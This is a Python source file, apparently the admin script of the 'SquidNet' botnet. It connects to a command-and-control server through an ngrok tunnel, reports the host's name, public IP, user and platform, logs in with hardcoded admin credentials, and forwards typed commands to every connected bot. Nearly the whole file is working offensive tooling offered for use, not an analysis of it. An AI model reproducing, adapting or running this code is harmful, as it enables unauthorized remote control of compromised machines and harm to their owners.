
import socket, threading, os, time, urllib.request, sys
class BotMaster:
    def __init__(self, ip, port, name, admin_password):
        self.ip = ip
        self.port = port
        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.client.connect((self.ip, self.port))
        msg = str(socket.gethostname() + " " + self.getip() + " " + os.getlogin()+" "+sys.platform).encode()
        self.client.send(msg)
        self.name = name
        self.admin_password = admin_password
        time.sleep(1)
        self.client.send("!CLIENTLOG".encode())
        time.sleep(1)
        self.client.send(f"!login {self.name} {self.admin_password}".encode())
        self.logo()
        print("\n[+] Successfully logged into the Botnet!")
        print("[+] You are able to access the Botnet and also give commands to all of the connected bots!")
        print("")
        self.reciever = threading.Thread(target=self.recv)
        self.reciever.start()
        self.sender = threading.Thread(target=self.send)
        self.sender.start()
    def logo(self):
        print('''
  _____             _     _ __  __           _            
 / ____|           (_)   | |  \/  |         | |           
| (___   __ _ _   _ _  __| | \  / | __ _ ___| |_ ___ _ __ 
 \___ \ / _` | | | | |/ _` | |\/| |/ _` / __| __/ _ \ '__|
 ____) | (_| | |_| | | (_| | |  | | (_| \__ \ ||  __/ |   
|_____/ \__, |\__,_|_|\__,_|_|  |_|\__,_|___/\__\___|_|   
           | |                                            
           |_|                                                                                                      
SquidNet Admin Script By DrSquid''')
    def getip(self):
        try:
            url = 'https://httpbin.org/ip'
            req = urllib.request.Request(url)
            result = urllib.request.urlopen(req)
            try:
                result = result.read().decode()
            except:
                result = result.read()
            contents = result.split()
            ip = contents[2].strip('"')
            return ip
        except:
            pass
    def send(self):
        while True:
            try:
                msg = input("[(ADMIN)]: ")
                self.client.send(msg.encode())
            except:
                print("[+] There may be a server error. Try to relogin to the botnet.")
    def recv(self):
        while True:
            try:
                msg = self.client.recv(65500).decode()
                if msg == "":
                    pass
                else:
                    print('\n' + msg)
            except:
                print("\n[+] Possible Server Error! Try to re-login to the Botnet!")
                print("[+] If this is a re-occuring message, contact the Server Owner.")
                print("\n[+] Attempting to re-connect to the server.")
                while True:
                    try:
                        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        self.client.connect((self.ip, self.port))
                        msg = str(
                            socket.gethostname() + " " + self.getip() + " " + os.getlogin() + " " + sys.platform).encode()
                        self.client.send(msg)
                        time.sleep(1)
                        self.client.send("!CLIENTLOG".encode())
                        time.sleep(1)
                        self.client.send(f"!login {self.name} {self.admin_password}".encode())
                        print("[+] Successfully Logged Back Into the botnet.")
                        break
                    except:
                        pass
admin = BotMaster('6.tcp.ngrok.io',15088,'admin','root')      
        